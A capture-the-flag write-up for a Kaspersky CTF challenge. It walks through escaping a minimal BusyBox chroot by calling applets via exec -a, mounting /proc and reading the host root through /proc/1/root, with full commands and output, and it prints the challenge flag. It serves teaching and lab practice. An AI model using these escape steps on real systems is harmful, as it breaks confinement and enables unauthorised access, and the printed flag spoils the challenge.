@@ -1,0 +1,374 @@
+---
+layout: writeup
+lang: en
+permalink: /en/writeups/chroot-silver/
+title: "chroot-silver"
+ref: chroot-silver
+date: 2026-08-01
+bare: true
+platform: KCTF
+platform_color: "#0f7a3d"
+os: Linux (BusyBox / musl)
+series: kaspersky-ctf-2026
+tags: [misc, chroot, busybox, escape, proc, linux]
+txt: /writeups-files/chroot-silver.txt
+summary: "77 points. The shell starts inside a chroot with only two directories and no commands. But /bin/sh is BusyBox, which contains mount and everything else: you mount /proc and from there you get out of the cage."
+---
+
+# Writeup — chroot-silver (Kaspersky CTF 2026)
+
+Category: misc
+Value: 77 points (221 solves)
+Link: https://ctf.kaspersky.com/challenges/14
+Date: 
+
+FLAG: kaspersky{4f262050-065b-475f-8130-cb6a7f2b4905}
+
+---
+
+## Summary
+
+A 77-point challenge whose entire surface is a single shell. You connect over TLS to the assigned instance with openssl s_client and end up inside a /bin/sh confined to an extremely minimal chroot: only two visible directories, /bin containing just sh, and /lib with the musl linker and libc. No external utilities, no /proc, no /dev, no flag file anywhere reachable.
+
+The point of the challenge is that /bin/sh is BusyBox, and BusyBox is a multi-call binary: all the applets (mount, ls, cat, chroot, nsenter, nc) live inside that one executable and are reached by changing the name it is invoked with, that is with exec -a. From there you create /proc by hand, mount the proc filesystem, and /proc/1/root gives access to the root filesystem of PID 1, which is outside the chroot. The flag is in /root
+
+Chain: openssl s_client → BusyBox ash shell in a chroot → enumeration, two-directory filesystem → exec -a busybox /bin/sh --list reveals all the applets → exec -a id confirms uid=0 → mkdir /proc via applet → mount -t proc → /proc/1/root → /root/flag.txt.
+
+---
+
+## additional tools and methodology
+
+an llm was used during the session: for interpreting raw output, suggesting unexplored vectors when stuck and detailed explanation of technical concepts. the execution and the operational decisions were mine. the writeup was written by me and later cleaned up with the same tool.
+
+the idea of invoking BusyBox with exec -a to reach the applets came from the chatbot after manual enumeration had run out completely.
+
+---
+
+## Preface
+
+I solved this challenge across several separate sessions and most of the time went into enumeration that got nowhere. the chroot is so bare that after twenty minutes you have already seen everything there is, and from then on you're only retrying things that don't exist: ls, id, env, nc, socat, readlink, chroot, mount as separate binaries. all not found
+
+the method that eventually worked was working one command at a time while keeping a written record of every test already done, because the session closes constantly (exec replaces the shell, so every applet invoked that way terminates the connection) and without a log you repeat the same attempts on every reconnection. in the log below, every block that starts again from openssl s_client is a forced reconnection.
+
+the local prompt in the output blocks has been replaced with $ at publication time.
+
+---
+
+## Phase 1 — Connection
+
+the challenge suggests the command directly, with the instance to substitute:
+
+openssl s_client -connect .tcp.kit.sasc.tf:443 -servername .tcp.kit.sasc.tf -quiet
+
+with the personal instance started, the assigned host was 960edf79d1664d39a817.tcp.kit.sasc.tf:443
+
+$ openssl s_client -connect 960edf79d1664d39a817.tcp.kit.sasc.tf:443 -servername 960edf79d1664d39a817.tcp.kit.sasc.tf -quiet
+depth=3 C = US, O = Internet Security Research Group, CN = ISRG Root X1
+depth=0 CN = *.kit.sasc.tf
+verify return:1
+/bin/sh: can't access tty; job control turned off
+~ #
+
+TLS connection successful, wildcard certificate *.kit.sasc.tf signed by Let's Encrypt. the tty message and the ~ # prompt already say two things: we're in a non-interactive /bin/sh and we're root.
+
+---
+
+## Phase 2 — Enumerating the chroot
+
+first command and first wall:
+
+~ # ls -la
+/bin/sh: ls: not found
+
+~ # pwd
+/
+
+we're at the root. without ls the only way to list is the shell's glob:
+
+~ # echo /*
+/bin /lib
+
+~ # echo /bin/*
+/bin/sh
+
+~ # echo /lib/*
+/lib/ld-musl-x86_64.so.1 /lib/libc.musl-x86_64.so.1
+
+two directories in total. in /bin only sh, in /lib the musl dynamic linker and the musl libc. the visible filesystem is therefore:
+
+/
+├── bin/
+│   └── sh
+└── lib/
+    ├── ld-musl-x86_64.so.1
+    └── libc.musl-x86_64.so.1
+
+set gives the complete context of the process:
+
+BB_ASH_VERSION='1.37.0'
+HISTFILE='/.ash_history'
+HOME='/'
+HOSTNAME='(none)'
+PATH='/bin:/sbin:/usr/bin:/usr/sbin'
+PPID='458'
+PS1='\w \$ '
+PWD='/'
+SHLVL='2'
+SOCAT_PEERADDR='[0000:0000:0000:0000:0000:ffff:0ac4:1bf0]'
+SOCAT_PEERPORT='60924'
+SOCAT_PID='458'
+SOCAT_PPID='1'
+SOCAT_SOCKADDR='[0000:0000:0000:0000:0000:ffff:0a00:020f]'
+SOCAT_SOCKPORT='31337'
+SOCAT_VERSION='1.8.0.0'
+TERM='linux'
+
+what matters here:
+
+BB_ASH_VERSION=1.37.0 says the shell is BusyBox ash, not a generic sh. it's the piece of data that in hindsight solves the whole challenge, and at the time I recorded it without understanding its weight.
+the connection is handled by socat, with SOCAT_PPID=1, so socat is a direct child of init. the internal socket is exposed on 31337 and the remote peer is on 60924.
+the PATH points to four directories, three of which don't even exist.
+
+help lists the available builtins:
+
+. : [ [[ alias bg break cd chdir command continue echo eval exec
+exit export false fg getopts hash help history jobs kill let
+local printf pwd read readonly return set shift source test times
+trap true type ulimit umask unalias unset wait
+
+many builtins, no external utilities. and above all exec, which is what will be needed.
+
+the directories you would normally take for granted aren't there:
+
+~ # echo /proc/*
+/proc/*
+
+~ # echo /dev/*
+/dev/*
+
+~ # echo /sbin/* /usr/bin/* /usr/sbin/*
+/sbin/* /usr/bin/* /usr/sbin/*
+
+a glob that finds nothing returns the pattern itself, so none of these exist. no /proc is the detail that weighs most of all, because it's the classic way out of a chroot.
+
+~ # echo /.[!.]* /..?*
+/.[!.]* /..?*
+
+no dotfiles.
+
+---
+
+## Phase 3 — Everything that didn't work
+
+this phase is long and I report it in full, because the value is in the exclusion: once I have found the right way, I'll know for certain there were no others.
+
+id doesn't exist, tried also inside command substitution:
+
+~ # printf 'uid=%s euid=%s gid=%s egid=%s\n' "$(id -u)" "$(id -u)" "$(id -g)" "$(id -g)"
+/bin/sh: id: not found
+/bin/sh: id: not found
+/bin/sh: id: not found
+/bin/sh: id: not found
+uid= euid= gid= egid=
+
+the flag in the obvious places, /flag: doesn't exist.
+
+getting out of the chroot with relative paths, cd /bin && cd ../.. and cd .. from /: you always stay confined to /. it's the correct behaviour of a chroot, .. on the root points to itself.
+
+invoking libc directly, exec /lib/ld-musl-x86_64.so.1 /bin/sh: it hangs, interrupted with Ctrl+C, no result.
+
+type sh; type ash; type bash: only /bin/sh, ash and bash don't exist as separate commands.
+
+/dev/fd and /proc/self/fd: not accessible, and readlink doesn't exist to query them.
+
+command -V on everything that would have been useful: chroot, mount, nc, socat, all not found.
+
+/proc/self/status, /proc/1/status, /proc/self/cmdline: all non-existent, consistent with /proc being absent.
+
+history: no output, despite HISTFILE being set to /.ash_history.
+
+kill -0 1: exit=0. PID 1 exists and is reachable from our namespace, something that will later turn out to be the key point, but without /proc I couldn't do anything with it.
+
+at this point the state was: root inside a chroot with two directories, no utilities, no flag, no escape. and the feeling of having exhausted the surface.
+
+---
+
+## Phase 4 — BusyBox behind /bin/sh
+
+the breakthrough is in the piece of data from Phase 2 that I had recorded and not used: BB_ASH_VERSION. if the shell is BusyBox, /bin/sh isn't a shell, it's the complete BusyBox binary, and BusyBox is a multi-call binary: it decides which applet to run by looking at argv[0], that is the name it was invoked with. all the applets live inside that single file.
+
+the exec builtin accepts -a to set argv[0] to anything. so:
+
+~ # exec -a busybox /bin/sh --list
+[
+[[
+acpid
+...
+cat
+...
+chroot
+...
+id
+...
+ls
+...
+mount
+...
+nc
+...
+nsenter
+...
+pivot_root
+...
+switch_root
+...
+unshare
+...
+zcip
+
+the complete list, hundreds of applets. inside it there is everything I had looked for as separate binaries and that didn't exist: mount, chroot, nsenter, unshare, pivot_root, switch_root, nc, ls, id, cat, wget, vi.
+
+privilege confirmation, the right way round:
+
+~ # exec -a id /bin/sh
+uid=0 gid=0
+
+we're root. and the cost of this method shows immediately: exec replaces the shell process, so when the applet terminates the session closes and you have to reconnect. every command from here on is a new connection.
+
+the reason id on its own gave not found and invoked this way works is that BusyBox applets have no binaries of their own in the chroot: normally they are symlinks to busybox, and here those symlinks were never created. the code had been there all along, only the name to reach it was missing.
+
+---
+
+## Phase 5 — Creating and mounting /proc
+
+with mount available the route is the classic one: mount proc and use it to look outside the chroot. first direct attempt:
+
+~ # exec -a mount /bin/sh -t proc proc /proc
+mount: mounting proc on /proc failed: No such file or directory
+
+the error isn't about permissions, it's about the mount point: /proc doesn't exist as a directory, and mount doesn't create it. mkdir is needed, which is another applet.
+
+here I first tried to wrap the two things in a subshell with env, which doesn't exist:
+
+~ # env -i PATH=/bin /bin/sh -c 'exec -a mount /bin/sh -t proc proc /proc'
+/bin/sh: env: not found
+
+the form that works uses sh -c so the main shell isn't killed by the exec:
+
+~ # sh -c 'exec -a mkdir /bin/sh /proc'
+
+~ # exec -a ls /bin/sh /
+bin
+lib
+proc
+
+/proc created. reconnected, this time the mount goes through without saying anything:
+
+~ # exec -a mount /bin/sh -t proc proc /proc
+
+and the proc filesystem is the host's real one:
+
+~ # exec -a ls /bin/sh /proc
+1
+10
+107
+108
+112
+12
+...
+954
+955
+96
+acpi
+buddyinfo
+bus
+cgroups
+cmdline
+consoles
+cpuinfo
+...
+self
+slabinfo
+softirqs
+stat
+swaps
+sys
+sysrq-trigger
+sysvipc
+thread-self
+timer_list
+tty
+uptime
+version
+vmallocinfo
+vmstat
+zoneinfo
+
+dozens of PIDs, not just ours. we're in a chroot but not in a separate PID namespace, so we see every process of the system hosting us. this is the condition that makes the escape possible: the chroot changes the view of the filesystem, not the view of the processes.
+
+---
+
+## Phase 6 — Escape via /proc/1/root and the flag
+
+/proc/<pid>/root is a symlink to the root filesystem as seen by that process. PID 1 isn't inside our chroot, so its root is the real root:
+
+~ # exec -a ls /bin/sh /proc/1/root
+app
+bin
+dev
+etc
+init
+lib
+proc
+root
+sbin
+sys
+tmp
+usr
+
+a complete filesystem, with /root, /etc, /app. we're out.
+
+~ # exec -a ls /bin/sh /proc/1/root/root
+flag.txt
+
+~ # exec -a cat /bin/sh /proc/1/root/root/flag.txt
+kaspersky{4f262050-065b-475f-8130-cb6a7f2b4905}
+
+---
+
+## Full chain
+
+openssl s_client to the assigned instance → /bin/sh shell in a chroot, root prompt
+→ echo /* : only two directories, /bin (just sh) and /lib (linker + musl libc)
+→ set : BB_ASH_VERSION=1.37.0, connection handled by socat with SOCAT_PPID=1
+→ no /proc, /dev, /sbin, /usr; no external utilities; no dotfiles
+→ dead ends: /flag non-existent, .. confined, ld-musl directly hangs, chroot/mount/nc/socat not found
+→ kill -0 1 returns 0, PID 1 is reachable but without /proc it's unusable
+→ /bin/sh is BusyBox: exec -a busybox /bin/sh --list exposes all the applets
+→ exec -a id /bin/sh confirms uid=0 gid=0
+→ direct mount fails, the mount point doesn't exist
+→ sh -c 'exec -a mkdir /bin/sh /proc' creates the directory without killing the shell
+→ exec -a mount /bin/sh -t proc proc /proc mounts the host's real proc
+→ /proc shows every PID on the system: chroot with no separate PID namespace
+→ /proc/1/root is the root filesystem of PID 1, outside the chroot
+→ /proc/1/root/root/flag.txt read with the cat applet → flag
+
+---
+
+## Lessons learned
+
+the piece of data that solved the challenge was in my hands after five minutes and I didn't read it. BB_ASH_VERSION in the output of set says the shell is BusyBox, and BusyBox is a multi-call binary: from there the whole toolchain was already present on the system. I spent two sessions looking for binaries that couldn't exist instead of asking myself what exactly the one binary that was present actually is.
+
+a chroot is not a sandbox. it isolates the view of the filesystem and nothing else: PID namespace, mount namespace and privileges stay as they were. being root inside a chroot that can see the host's processes means you already have the escape in your hands, you only need a way to express it. the correct defence isn't a bare chroot, it's a container with separate namespaces and reduced capabilities.
+
+the absence of /proc is not a protection if you can mount it. blocking its visibility without taking CAP_SYS_ADMIN away from the process is a half measure, and mkdir plus mount cancels it in two commands.
+
+on a target where every command closes the session, the written record is worth more than speed. keeping a log of every test already done is what stopped me redoing the same enumeration on every reconnection, and it's also the reason why in the end I knew for certain that the BusyBox route was the only one left
+
+exec replaces the process, sh -c wraps it. trivial, but it's the difference between running an applet and losing the shell on every command
+
+---
+
+## Tools used
+
+openssl s_client, BusyBox 1.37.0 invoked via exec -a (applets busybox --list, id, mkdir, mount, ls, cat), ash builtins (echo with globs, set, export, help, type, command -V, kill, printf, history)
